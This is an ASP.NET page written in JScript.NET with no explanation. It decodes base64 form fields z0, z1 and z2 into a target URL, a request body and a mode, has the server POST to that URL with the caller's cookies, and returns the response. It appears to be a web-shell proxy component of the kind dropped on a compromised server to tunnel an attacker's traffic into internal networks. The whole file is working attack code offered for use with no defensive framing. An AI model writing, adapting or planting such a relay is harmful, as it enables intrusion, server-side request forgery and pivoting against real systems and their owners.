<%

function base64Decode(str) {
    if (!str || str.Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function base64DecodeBytes(str) {
    if (!str || str.Trim() == "") return new byte[0];
    try {
        return System.Convert.FromBase64String(str);
    } catch(e) { return new byte[0]; }
}

function base64Encode(bytes) {
    try {
        return System.Convert.ToBase64String(bytes);
    } catch(e) { return ""; }
}

function httpSend(url, method, postDataBytes, mode, responseObj, requestObj) {
    try {
        var request = System.Net.HttpWebRequest(System.Net.WebRequest.Create(url));
        request.Method = method;
        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        request.Timeout = 15000;
        request.ReadWriteTimeout = 15000;
        request.AllowAutoRedirect = true;

        var cookieHeader = requestObj.Headers["Cookie"];
        if (cookieHeader != null && cookieHeader != "") {
            request.Headers["Cookie"] = cookieHeader;
        }

        var contentType = (mode == "binary") ? "application/octet-stream" : "application/x-www-form-urlencoded";
        request.ContentType = contentType;

        if (method.ToUpper() == "POST" && postDataBytes != null) {
            request.ContentLength = postDataBytes.Length;
            var dataStream = request.GetRequestStream();
            dataStream.Write(postDataBytes, 0, postDataBytes.Length);
            dataStream.Close();
        }

        var response = System.Net.HttpWebResponse(request.GetResponse());
        
        var setCookieHeaders = response.Headers.GetValues("Set-Cookie");
        if (setCookieHeaders != null) {
            for (var i = 0; i < setCookieHeaders.Length; i++) {
                responseObj.AddHeader("Set-Cookie", setCookieHeaders[i]);
            }
        }

        var responseStream = response.GetResponseStream();
        var ms = new System.IO.MemoryStream();
        var buffer = System.Array.CreateInstance(System.Byte, 4096);
        var readBytes = 0;
        while ((readBytes = responseStream.Read(buffer, 0, buffer.Length)) > 0) {
            ms.Write(buffer, 0, readBytes);
        }
        var rawBytes = ms.ToArray();
        ms.Close();
        responseStream.Close();
        response.Close();

        if (mode == "binary") {
            return base64Encode(rawBytes);
        } else {
            return System.Text.Encoding.UTF8.GetString(rawBytes);
        }

    } catch(e) {
        if (e.Response != null) {
            var errRes = System.Net.HttpWebResponse(e.Response);
            var setCookieHeaders = errRes.Headers.GetValues("Set-Cookie");
            if (setCookieHeaders != null) {
                for (var i = 0; i < setCookieHeaders.Length; i++) {
                    responseObj.AddHeader("Set-Cookie", setCookieHeaders[i]);
                }
            }

            var errStream = errRes.GetResponseStream();
            var ms = new System.IO.MemoryStream();
            var buffer = System.Array.CreateInstance(System.Byte, 4096);
            var readBytes = 0;
            while ((readBytes = errStream.Read(buffer, 0, buffer.Length)) > 0) {
                ms.Write(buffer, 0, readBytes);
            }
            var rawBytes = ms.ToArray();
            ms.Close();
            errStream.Close();
            errRes.Close();

            if (mode == "binary") {
                return base64Encode(rawBytes);
            } else {
                return System.Text.Encoding.UTF8.GetString(rawBytes);
            }
        }
        return "";
    }
}

Response.ContentType = "text/plain";

var z0 = Request.Form["z0"];
var z1 = Request.Form["z1"];
var z2 = Request.Form["z2"];

var url = base64Decode(z0);
var mode = base64Decode(z2);

var postDataBytes;
if (mode == "binary") {
    postDataBytes = base64DecodeBytes(z1);
} else {
    var textData = base64Decode(z1);
    postDataBytes = System.Text.Encoding.UTF8.GetBytes(textData);
}

var body = httpSend(url, "POST", postDataBytes, mode, Response, Request);
Response.Write(body);
%>